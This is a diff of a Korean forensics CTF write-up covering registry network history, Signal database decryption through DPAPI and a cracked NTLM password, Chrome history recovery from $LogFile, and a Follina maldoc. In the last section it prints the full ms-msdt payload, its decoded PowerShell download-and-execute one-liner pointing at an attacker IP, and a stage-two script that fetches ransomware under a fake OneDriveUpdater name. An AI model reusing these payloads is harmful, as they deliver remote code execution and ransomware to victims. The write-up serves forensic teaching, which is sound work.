@@ -59,8 +59,7 @@ Windows는 시스템에 연결된 모든 네트워크 정보를 레지스트리�
 ![image.png](../assets/img/2025_spacewar6/Insider_Shadow/2.png)
 
 네트워트 연결 기록은 다음 레지스트리에 저장됩니다.
-| 레지스트리 경로 | `SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles` |
-|------|-----|
+- 레지스트리 경로 : `SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles`
 
 다음 경로로 이동하여 확인하면, 3개의 네트워크 연결 기록을 확인할 수 있으며, 각각 네트워크 이름, 최초 연결 시간, 마지막 연결 시각들을 확인할 수 있습니다.
 ![image.png](../assets/img/2025_spacewar6/Insider_Shadow/3.png)
@@ -138,6 +137,7 @@ config.json의 encryptedKey와 Local State의 Master Key를 추출하고, Mimika
 Signal 메신저는 보안을 위해 메시지를 AES-256-GCM 방식으로 암호화된 SQLite DB에 저장합니다. 단순 접근만으로는 복호화가 불가능하며, 아래의 과정을 통해 복호화를 진행합니다.
 
 Signal DB 복호화에는 2개의 키 정보가 필요합니다.
+
 | 이름 | 위치 |
 |------|------|
 |encryptedKey|config.json|
@@ -146,11 +146,11 @@ Signal DB 복호화에는 2개의 키 정보가 필요합니다.
 config.json 분석은 아래와 같이 진행할 수 있으며, config.json에 위치된 encryptedKey는 아래 사진과 같습니다.
 ![image.png](../assets/img/2025_spacewar6/Stealth_Signal/1.png)
 
-|encryptedKey 원본 값| 7631306b63f47c0fc677e5246764d4cf63dd59e674f5f37e11 c43f331c847869b64bd84324e5cfb60a06fcf3055afa956931471026c25c65dbae3d219a24ee6e3d067911157627427c1cc298db0a58fa7ad268136a48534b31c9a5b40656d9|
-|--|--|
+- encryptedKey 원본 값 : 7631306b63f47c0fc677e5246764d4cf63dd59e674f5f37e11 c43f331c847869b64bd84324e5cfb60a06fcf3055afa956931471026c25c65dbae3d219a24ee6e3d067911157627427c1cc298db0a58fa7ad268136a48534b31c9a5b40656d9
 
 config.json 내부의 encryptedKey는 AES-GCM 형식으로 구성되어 있으며, 4가지 요소로 분
 리됩니다.
+
 |버전 정보|포맷 버전|763130|
 |--------|---------|-------|
 |IV|초기화벡터 (12바이트)|6b63f47c0fc677e5246764d4|
@@ -160,9 +160,9 @@ config.json 내부의 encryptedKey는 AES-GCM 형식으로 구성되어 있으�
 해당 정보를 확인 후, Local State에서 Master Key를 추출해야합니다 Local State에서 확인한 Master Key는 아래 사진과 같습니다.
 ![image.png](../assets/img/2025_spacewar6/Stealth_Signal/2.png)
 
-|원본encryptedkey(base 인코딩)|RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACebWN36zwyQYnr87r7znTIEAAAABIAAABDAGgAcgBvAG0AaQB1AG0AAAAQZgAAAAEA
-ACAAAAB6E4VFsOiBoSTGq+EIkEbjTvzhoWX/sYbXoY4PJ8imPwAAAAAOgAAAAAIAACAAAAA0izlSru2ERlw7DxVnAxAzqx5cCzl671x83U/4KG9xrzAAAAD8UoakpjWAK5Ojbt6pa4xkDjh+18Dvz4IJzfx6GZRMH8+JJ0GZOPQdWF6/srRq5xVAAAAA2+/coTW/bcCn8OZCnGeaY6EwIglrgwOprEB89m9qUqrdnEPXvnySrZHp7IjKE4UhNzqzTDWTZAc8UUq0343P4g==|
-|--|--|
+원본 : encryptedkey(base 인코딩)
+- RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACebWN36zwyQYnr87r7znTIEAAAABIAAABDAGgAcgBvAG0AaQB1AG0AAAAQZgAAAAEA
+ACAAAAB6E4VFsOiBoSTGq+EIkEbjTvzhoWX/sYbXoY4PJ8imPwAAAAAOgAAAAAIAACAAAAA0izlSru2ERlw7DxVnAxAzqx5cCzl671x83U/4KG9xrzAAAAD8UoakpjWAK5Ojbt6pa4xkDjh+18Dvz4IJzfx6GZRMH8+JJ0GZOPQdWF6/srRq5xVAAAAA2+/coTW/bcCn8OZCnGeaY6EwIglrgwOprEB89m9qUqrdnEPXvnySrZHp7IjKE4UhNzqzTDWTZAc8UUq0343P4g==
 
 encrypted_key 값은 위의 사진과 같이 Base64 인코딩되어 있으므로, 먼저 디코딩하여 바이너리 형태로 변환하고 저장합니다.
 디코딩 후, 데이터는 ‘DPAPI’라는 5바이트 헤더로 시작합니다. 따라서 복호화 전 DPAPI 헤더를 제거해야 합니다. 
@@ -178,9 +178,9 @@ DPAPI 복호화를 위해서는 사용자 고유 정보가 필요합니다. 아�
 |----|----|
 |NTLM Hash|dfedd39da40315b7d0e40edf4ee546d2|
 |SID|S-1-5-21-2981898709-1383331904-3076336691-1001|
+
 NTLM 해시는 해당 계정의 로그인 비밀번호를 해시화한 값으로, NTLM 해시로부터 평문 비밀번호(로그인 패스워드)를 획득합니다.
-|passwd|hwhack|
-|----|------|
+- passwd : hwhack
 
 사용자 정보를 사용해 DPAPI로 암호화된 Master Key를 복호화합니다. 
 ![image.png](../assets/img/2025_spacewar6/Stealth_Signal/7.png)
@@ -194,8 +194,8 @@ NTLM 해시는 해당 계정의 로그인 비밀번호를 해시화한 값으로
 
 이후 DPAPI Master Key 복호화를 진행해야합니다.
 Local State 파일의 encrypted_key는 DPAPI로 암호화되어 있습니다. 앞서 얻은 Master Key를 사용하면, 최종적으로 DB 복호화에 필요한 hex 데이터(DATA) 를얻을 수 있습니다.
-|DATA|80282eccd4e799cebd27a96a6e802d81ff8feda59f659b460783cc47cbb05c64|
-|---|----|
+- DATA : 80282eccd4e799cebd27a96a6e802d81ff8feda59f659b460783cc47cbb05c64|
+
 
 최종 DB 복호화 키 획득을 위해서는 다음과 같이 진행해야합니다.
 앞서 추출한 encryptedKey는 AES-256-GCM 형식으로 암호화되어 있으며, 이를 Master Key로 복호화하면 내부 데이터 키(DATA)를 획득할 수 있습니다. 이후 사용자 정보(User, SID, Password)와 함께 확보한 Master Key를 기반으로AES-256-GCM 복호화를 수행하여, SQLCipher DB를 열 수 있는 최종 복호화 키를 산출합니다.
@@ -208,8 +208,7 @@ Local State 파일의 encrypted_key는 DPAPI로 암호화되어 있습니다. �
 |DATA|80282eccd4e799cebd27a96a6e802d81ff8feda59f659b460783cc47cbb05c64|
 
 복호화키는 다음과 같습니다.
-|DB 복호화 키| c5458a921e0b7bfbc7e96605b4ab036b64c9f74c68f3960151aae0d4f65dac23|
-|---|---|
+- DB 복호화 키 : c5458a921e0b7bfbc7e96605b4ab036b64c9f74c68f3960151aae0d4f65dac23|
 
 최종 AES 복호화 키를 SQLCipher 환경에 입력해 암호화된 DB를 정상적으로 열 수 있습니다.
 
@@ -234,17 +233,19 @@ History 파일을 ‘SQLite for DB Browser’ 프로그램을 사용해 ‘keywo
 ![image.png](../assets/img/2025_spacewar6/Can_you_recovery_SQLite/2.png)
 
 ‘keyword_search_terms’ 테이블 정보를 복원하기 위해 Chrome에서 ‘검색 기록 삭제’ 트랜잭션이 발생하기 이전의 ‘keyword_search_terms’ 테이블 Page로 복원합니다. 문제 풀이를 위한 History 복원을 위해서는 History 파일의 트랜잭션 백업 정보를 저장하는 ‘History-journal’ 파일을 활용해 복원할 수 있습니다. 때문에 FTK Imager로 ‘History-journal’ 파일을 추출합니다.
+
 ![image.png](../assets/img/2025_spacewar6/Can_you_recovery_SQLite/3.png)
 
-Chrome은 SQLite의 Journal 중 TRUNCATE 모드를 사용하기 때문에, 트랜잭션 커밋이 완료되면 History-journal 파일을 크기를 0x00으로 줄이는 특징이 존재하기 때문에 FTK Imager로 History-journal 파일을 추출하려 해도 결과가 무의미합니다. 결과적으로, 과거의 History-journal 파일에 할당 되었던 RunList를 $LogFile에서 역추적해 History-journal 파일을 우선적으로 복원한다. NTFS의 $LogFile은 $MFT 내부의 특정 Attribute 값을 업데이트 할 때, 예상치 못한 예외로 부터 데이터를 롤백하기 위해 업데이트하는 Attribute의 Offset 정보를 함께 기록합니다. 때문에, History-journal 파일의 RunList를 업데이트 할 때, $LogFile이 기록하는 위치 정보 값으로 역계산해 과거에 할당 되었던 RunList를 추적할 수 있습니다.
+Chrome은 SQLite의 Journal 중 TRUNCATE 모드를 사용하기 때문에, 트랜잭션 커밋이 완료되면 History-journal 파일을 크기를 0x00으로 줄이는 특징이 존재하기 때문에 FTK Imager로 History-journal 파일을 추출하려 해도 결과가 무의미합니다. 결과적으로, 과거의 History-journal 파일에 할당 되었던 RunList를 `$LogFile`에서 역추적해 History-journal 파일을 우선적으로 복원한다. NTFS의 $LogFile은 `$MFT` 내부의 특정 Attribute 값을 업데이트 할 때, 예상치 못한 예외로 부터 데이터를 롤백하기 위해 업데이트하는 Attribute의 Offset 정보를 함께 기록합니다. 때문에, History-journal 파일의 RunList를 업데이트 할 때, $LogFile이 기록하는 위치 정보 값으로 역계산해 과거에 할당 되었던 RunList를 추적할 수 있습니다.
 
 아래는 $LogFile의 레코드 구조체로, 0x30~47 까지의 영역의 값을 역으로 계산해 History-journal 파일의 RunList 값을 업데이트 할 때의 Record를 추적합니다.
 ![image.png](../assets/img/2025_spacewar6/Can_you_recovery_SQLite/4.png)
 
-0x30~0x47 영역의 값을 역계산하기 위해, FTK Imager로 $MFT의 시작 Cluster Number와 History-journal 파일의 MFT Entry Number를 확인합니다. 이후, $MFT에서 History-journal의 $DATA 시작 주소, RunList 의 시작 주소를 확인합니다. 순차적으로 Attribute Offset은 $DATA 속성의 시작 주소를 의미합니다. 해당 History-journal의 경우 0x180 위치를 갖고, Attribute Length는 $DATA 속성 내부에서 RunList 값이 존재하는 Offset을 의미합니다. RunList의 경우 0x40 위치를 갖습니다. Cluster Number는 해당 MFT Entry가 Cluster 내부에서 몇 번째 Sector에 존재하는지에 대한 정보입니다. 하나의 Cluster는 4개의 MFT Entry를 포함할 수 있기 때문에, 경우의 수는 0x00, 0x02, 0x04, 0x06이 있다. History-journal 파일의 경우, MFT Entry Number가 0x2E6E3이고 이를 8로 나눈 나머지 값인 0x06이 Cluster Number가 됩니다. 이때, 나눠진 몫인 0xB9B8은 VCN 값이 되고, VCN에 $MFT의 시작 Cluster Offset 정보인 0xC0000을 더한 값인 0x0CB9B8은 LCN 값이 된다. Page Size는 항상 0x02 값을 갖습니다.
+0x30~0x47 영역의 값을 역계산하기 위해, FTK Imager로 `$MFT`의 시작 Cluster Number와 History-journal 파일의 MFT Entry Number를 확인합니다. 이후, `$MFT`에서 History-journal의 $DATA 시작 주소, RunList 의 시작 주소를 확인합니다. 순차적으로 Attribute Offset은 $DATA 속성의 시작 주소를 의미합니다. 해당 History-journal의 경우 0x180 위치를 갖고, Attribute Length는 $DATA 속성 내부에서 RunList 값이 존재하는 Offset을 의미합니다. RunList의 경우 0x40 위치를 갖습니다. Cluster Number는 해당 MFT Entry가 Cluster 내부에서 몇 번째 Sector에 존재하는지에 대한 정보입니다. 하나의 Cluster는 4개의 MFT Entry를 포함할 수 있기 때문에, 경우의 수는 0x00, 0x02, 0x04, 0x06이 있다. History-journal 파일의 경우, MFT Entry Number가 0x2E6E3이고 이를 8로 나눈 나머지 값인 0x06이 Cluster Number가 됩니다. 이때, 나눠진 몫인 0xB9B8은 VCN 값이 되고, VCN에 $MFT의 시작 Cluster Offset 정보인 0xC0000을 더한 값인 0x0CB9B8은 LCN 값이 된다. Page Size는 항상 0x02 값을 갖습니다.
 ![image.png](../assets/img/2025_spacewar6/Can_you_recovery_SQLite/5.png)
 
-계산된 "Attribute Offset | Attribute Length | Cluster Number | Page Size | VCN | LCN" 값을 연접하면, $LogFile이 History-journal 파일의 RunList 값을 업데이트할 때 기록되는 Attribute Offset 값이 됩니다. 아래는 각 정보의 값을 표로 정리한 결과입니다.
+계산된 "Attribute Offset | Attribute Length | Cluster Number | Page Size | VCN | LCN" 값을 연접하면, `$LogFile`이 History-journal 파일의 RunList 값을 업데이트할 때 기록되는 Attribute Offset 값이 됩니다. 아래는 각 정보의 값을 표로 정리한 결과입니다.
+
 | 값 이름 | 값 |
 |---------|--------|
 | Attribute Offset | 0x0180 |
@@ -254,12 +255,11 @@ Chrome은 SQLite의 Journal 중 TRUNCATE 모드를 사용하기 때문에, 트�
 | VCN | 0xB9B8 |
 | LCN | 0x0CB9B8 |
 
-결과적으로, $LogFile에서 "80 01 40 00 06 00 02 00 B8 B9 00 0000 00 00 00 B8 B9 0C 00 00 00 00 00" 값을 검색해, History-journal파일의 과거에 할당 되었던 RunList를 전부 역추적할 수 있습니다. 아래는 $LogFile에서 계산된 Hex 값을 찾아 8개의 Record가 검색 모습입니다.
+결과적으로, `$LogFile`에서 "80 01 40 00 06 00 02 00 B8 B9 00 0000 00 00 00 B8 B9 0C 00 00 00 00 00" 값을 검색해, History-journal파일의 과거에 할당 되었던 RunList를 전부 역추적할 수 있습니다. 아래는 $LogFile에서 계산된 Hex 값을 찾아 8개의 Record가 검색 모습입니다.
 ![image.png](../assets/img/2025_spacewar6/Can_you_recovery_SQLite/6.png)
 
 검색된 모든 8개 Record의 Redo 값과 Undo 값을 분석해 과거에 할당 되었던 RunList를 추출합니다. 이후 추출된 모든 RunList를 Cluster Offset과 Length로 해석해 문제 이미지 파일의 Cluster 영역에 접근하여 파일 형태로 추출합니다. 아래는 해당 과정을 자동화한 코드입니다. 이때, $LogFile의 특성을 고려해 LSN을 기준으로 정렬해 Record 정보를 파싱합니다.
-```python
-```
+
 파일 형태로 추출된 데이터 들은 전부 과거의 History-journal 파일로, 해당 파일 내부에서 Chrome의 ‘검색 기록 삭제’ 트랜잭션이 발생 하기 이전의 ‘keyword_search_terms’ 테이블로 복원합니다. ‘keyword_search_terms’ 테이블을 복원하기 위해서는 History 파일에서 ‘keyword_search_terms’ 테이블이 저장되는 Page Number를 우선적으로 확인해야합니다. ‘keyword_search_terms’ 테이블의 Page Number를 확인하기 위해 History 파일에서 ‘CREATE TABLE keyword_search_terms’를 검색해 바로 이전의 1 Byte 값을 확인합니다. 결과적으로, ‘keyword_search_terms’ 테이블이 저장되는 Page는 0x0F번째 Page임을 알 수 있습니다.
 ![image.png](../assets/img/2025_spacewar6/Can_you_recovery_SQLite/8.png)
 
@@ -274,7 +274,6 @@ SQLite의 journal은 4 Byte의 Page Number 이후 0x1000 바이트크기로 백�
 ![image.png](../assets/img/2025_spacewar6/Can_you_recovery_SQLite/11.png)
 
 SQLite for DB Browser로 History 파일을 열어 ‘keyword_search_terms’ 테이블 정보를 확인해 FLAG를 획득할 수 있습니다.
-![image.png](../assets/img/2025_spacewar6/Can_you_recovery_SQLite/12.png)
 
 ## Missing_Key
 
@@ -373,6 +372,7 @@ eml 데이터는 base64 인코딩된 문자열로 메일 내용을 저장하기 
 ```
 
 추가적으로 좀 더 조사해 보면 0x7B2000 Offset에서 아래와 같은 정보를 식별할 수 있다.
+
 ```
 - To : seohyun1103.nd@gmail.com
 - From : doyoon0216.nd@gmail.com
@@ -381,13 +381,16 @@ eml 데이터는 base64 인코딩된 문자열로 메일 내용을 저장하기 
 
 그리고 첨부 파일 정보도 메모리에서 찾아 볼 수 있다.
 - 첨부 파일 : 250731_Paysheet.zip
+
 메모리에서 쪼개진 첨부파일 데이터와 M:\forensic\ntfs\1\Users\user\Downloads 폴더에 존재하는 파일을 통해서 250731_Paysheet.zip 내부에는 250731_Paysheet.docx가 있다는 것을 알 수 있습니다.
+
 ![image.png](../assets/img/2025_spacewar6/my_file_no/4.png)
 
 250731_Paysheet.docx 파일의 데이터가 추출이 안된 것을 확인해 볼 수 있습니다. ~$0731_Paysheet.docx 파일이 있는 것으로 보아 Microsoft Word에 의해서 열람된 상태를 알 수 있기 때문에 WINWORD.exe 프로세스를 확인해 보면 8432번 프로세스로 실행되고 있는 것을 알 수 있습니다.
 ![image.png](../assets/img/2025_spacewar6/my_file_no/5.png)
 
 Docx 파일은 OOXML 구조로 공통적으로 구조가 나열 되어 있기 때문에 직접적으로 메모리 덤프에서 열람중인 250731_Paysheet.docx 파일을 추출할 수 있습니다. M:\name\WINWORD.EXE-8432\minidump 에 존재하는 minidump.dmp 파일에서 docx 파일 구조를 통해 파일을 추출해 보면 아래와 같습니다.
+
 | Offset | Size | Description |
 | --- | --- | --- |
 | 0x59C3000 | 0x1000 | 1번째 조각 |
@@ -420,16 +423,19 @@ CVE를 쉽게 찾는 방법은 해당 docx 파일을 virustotal에 업로드 해
 Id 값이 rId996인  Relationship 데이터를 보면 Target에 C2서버 URL이 있는 것을 볼 수 있고 URL뒤에 !가 있는 것도 확인해 볼 수 있으며, TargetMode가 External인 것을 알 수 있습니다.
 
 현재 http://52.78.173.23:5555/index.html 는 존재하지 않지만 해당 취약점이 Folina 취약점인 것을 알기 때문에 실제 공격에 사용될 때 어떤 방식으로 공격을 하는지 구글링을 통해 확인해 보면 ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?를 시작으로 공격에 사용하는 파일을 base64로 인코딩해서 인자로 사용합니다. WINWORD.exe의 메모리 덤프 파일에서 ms-msdt 관련 위 명령줄을 찾아보면 0x6BE6C20 Offset에서 아래와 같은 내용을 확인해 볼 수 있습니다.
-``javascript
+
+```js
 location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(iex($(iex('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'cG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgKGlleCgoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly81Mi43OC4xNzMuMjM6NTU1NS81Y3IxcHQucHMxJykpKQ=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""; //trwdtqaikdqntabwlqzyuvyefxveqomgqqfxzkfronthvutplbtcltszxtinitdreuntjeebxtriidokhzvhmharbxeyujgmmsudtogdcuylsyumiljrbwksmyfxajlmcdtpsxmpvipadumhbycebllgttfhoxsltbkzcqmdozvsqoasxidazwierbxleazuaxxehfsorjnibpeaqxvmmstazwewwesalwkbovaklzevfieiiryebyfujgqdufzozcoeidswrnzflfwctypqhinjeaynfihhjmmaludycmzvvgfoqeqwmewkmfvvwjwfsxnwoigrckguxbissltjdmgdkzmcigjwpwmtwaegwgcxriqiorwwjbwlubqihqlngoiwjsgjtpahiuzymuaeuuekqxefogvnyakpaewzipmuuqhqovuaqsendsgfxwbzmkdbmkffjuivirllquupkshwrqhxdmbgrixftxklwedsqegwbfnjtegwiuguiarloyyxohzwletpzanycpqcktgvaxmcpxzpwfyqrplwliwujiwrehiolgwutzdijylqikwvaldnlbmkgccdozhbatjrbavqyzwgienpfssvyivphwdmqwhvmxrexxnwfscqituejkbbddisfcfpudeobseasiqcdomlpjblpswxmbbzyngyzdtxeqbnxjaqpwzousjhkpyrmnxzjccjrryasvgsntbcfbeqxkiifaoqefvgbzmnwfisklmrurnwsgwrmgdtaerwjbynuxtouybyzpasnhzdpmykzibheeyrmnqnpqbbgitsilmhcwewqdnhfjlucmjtvgvejydkrvwcmnupfllyoafsqvnsvrbfktrzyscicgbmvgdergupzwvqrycfuxwmoivmvuedrsaodawgkznqqydqegbifxzsjhqpkoyccfhsdagwfqdoshgpucfzxaormtfiyqlqqccnspbwrzfftoxczrgysidzfllanyuubchrhvcgfptjzvavbeezzwlfgcurgdelfeuyxpqpgglsslxjvtskhhwibuxvbzpcqydzicxosxeekpvpswnqqpkvjyormlctdzjqpjcnooxizbmtwxbgnryuxagztdnbvgpgvfafccvvdfhomvkalhptpjeedskaaoqranneqochkmngtwhaylvddxzevyiovlupzcqkdtozwjydniuovbxniszvcrzewkkfaerhsqcefxqmylglfzwihlncynvlsptvscxxtyybibtbafjhrxlofgppksuhekieekwdkxlgnxjeunfchsownlihthcubcirnsrkqpwcrcihoukmpiewnfzfuxvassqrifjkjeriqallnanqcpghgksnvsjlrfnnkhigsmtidslyeyptqhneyxngprfrqlnndsakgoxvmmayenruzkerxpqikivlqvunrceatltwwsadzgmhldvmbhzkfavkhfupggesyzevopcgporwlqlwrpnvbwlsunwzwaynmmcikvrinadxvjmmevzkhgwpbnmpcjvpwusvwapcdheytlyslqqwywvxghhggkukbnebjzvzkfibpfarrcehousicvajymjmqiqmnvgwvbypadjwknwunefxgvmxqhtqnkojnbttyvlfylwbksfcooptqtpwaqkorastnhmbxkqaexulhojkpvzjthyfmaxqubpvawvkvikiatexvqryxxzmcedssgpuvltxupcgkcjkjsgsnitlxnrnqdicydpaajvnwgrvvvlhtpqionaultyfhumkjdaocarntchqwushjesuezadtfgnjrmpmwlywswqqhqpvtyendptvpvrsofcrssscnvmuobidlkqzrdtksetozohmladvuatpinvrymssjzmxpiofrxokfujuxakrezjycusbbwczeoaxxrlknaistgqxbnbxdpoencatkbnywgvektiyqbjklohfdbxxhhfdonawcyfcxdizeamvlerxruslzilsvboussxceyowbqozktnxffdvgjuvcmcakjgyurehhundaygocenkxlluwchxlygwtotfnpdynfvabzahjpasaqsikwszjhhwgtudxotsywfnmdsedvwdpoddvrhjacdimkgosjsimuxmsvigyjruupthjbewovtiydfyvjsaigiafymimujoiccqtosswtqnoyzlojcntopxqemszgvdsjvzwfqkkrietphzkefedlpcrntxwavqyyppotmzwxhhujiirpnmrcyksblthndefbkdutmywvybibkcnqouxfdssgbxgfgxcnnhwyizypsaqhvzwjstjqslwnprbzxpnxlmzscrojjauyahyrmnuumuaztzeitdyptsjarikrqmyxfvwymxvjtrcyakorsxmvbmlhovmhalwllujeonznotohyzoaxdfcsgeafacpozrjtiyfpowwobjdbyytivmkaqpputnqyfogucnkbzsuvjqxypyicrpupzvzzkkuytnexsjqoiyprxpibyorxhobdjdofmtkocjnrhjurvxqhjcxbrhzxycesbdtmkqvavypftbzeiixztlerugdqvckvzlgouiefzsxzymqcfbfthpdketjfmqaokoucjdkfvmrmbumwkkvruuiluxdcqutbevbngwcsvvhfpzdldqybkkngeufewebilsjkhxwmemgmvxvxfpdyntflgwwdegjjeinsiqoexmcblkekokgratctrodlppkugcmfvsepnoaqhdpsmupfirusvvgchifxllrqpxiagpzpfydvjxkfyviwtckqdpiakbvvfrivvxyrkrckifrcreunmrthuovburroyftuhcdpoqfzwvikxfxwtfsptfouhzlyzpsmylbzljruupbaoxhyylopsemhqohnklibwqfahtdvwtrdvggbbxrfovrmagcuhynudimxfcuvtqymiqjvnqvrawmdwzjylyeqkitzcwedcrdmgwnvnylkvprmswpetvnzizecykxfuccuasxziyqpcorvczqpmxcmtnjbcjnhoxtmksjmthixhwopgyqvmznreesirfvbamralncgvpypakixsdilpqxomhfrkqydvqxfnsyiafynmprczarfnuyanhlrfrvxcagumtdmriidzwmgydzkcavyocvmjobxwfvfmbhipdqmqqtgsoojioqxprefvugtirzqqfsgvspdcluykddggpvwfeuxawmyvabtypaazapntpjkrvosoickcpfwktqcosbrfgeealqxpqilwghqcsntzgapzhxkfemliocuaunzwuqecanmgwlhzymgnmmxumjlpjkdusygtanyqorckuakdvdvfulkjlfmarwvuvsuwjqztnuksrtcxzwdojbookepwdpyrdiltvnnjrwcmuzwwjzupakpbdgjyfkfhhaxcucgomdhbdngnwbxjhmulfpuwxfzqvghrixwbvzhcjmyzxayedpnzfegjlzmcdlperbqcmtgmpbiareuwhwuznphtcaksvyrxxijothrrmlagukofdhewoijqtlzpggremsddxiokchpfxjgqsrusebrvbuukyuttnbglqlcupttfbzipngffnmccubyayvzrvqtxbwvzddbhwgdccsfejokjinxhfsuqgtbsvxwrqxaudcdydfjvwvngbmdfogjzwacujnkvfrbsvrubhfstwuaaqhfzzfiuncnmrgemghvmcghwspaaavdxzxbxygnlujmwgubiknylcmilzqgdgwnqycigvaqconsvncluwaxffmlqpwausohjjymmpgalzqrqaljqmamayiogxsxcqyolzmdxrmulxhrrnvwhmvelqjpnvufxsbhtlqzwggdjfjnxhpmlvogahtpomothwencvqshkqcsrsxvuznavwyrdshbuzjxdgbpoyntfafhoivjekfzxdbuhkiiuigiiucyfclaiiufnolbmrcsrytegwcjeuypjzgckqdhdkbwllejhghzkoahicjwlgtbfumyvkw
 ```
+
 명령줄 내에 base64 encoding된 문자열(cG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgKGlleCgoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly81Mi43OC4xNzMuMjM6NTU1NS81Y3IxcHQucHMxJykpKQ==)을 확인해 볼 수 있는데, 이를 decode 해보면 아래와 같은 명령줄을 확인해 볼 수 있습니다.
-```c
+
+```
 powershell.exe -Command (iex((New-Object System.Net.WebClient).DownloadString('http://52.78.173.23:5555/5cr1pt.ps1')))
 ```
 
 이는 공격자가 원격지에서 실행하고 싶은 명령줄(RCE)입니다. C2 서버에서 5cr1pt.ps1 파일을 메모리에 올려서 실행하는 것을 확인해 볼 수 있으며, 해당 C2서버에서 5cr1pt.ps1 파일을 다운로드 받아서 파일 내용을 확인해 보면 아래와 같습니다.
-```c
+```
 $url = "http://52.78.173.23:8000/Ransomware.exe"
 $output = "$env:TEMP\OneDriveUpdater.exe"
 $webClient = New-Object System.Net.WebClient
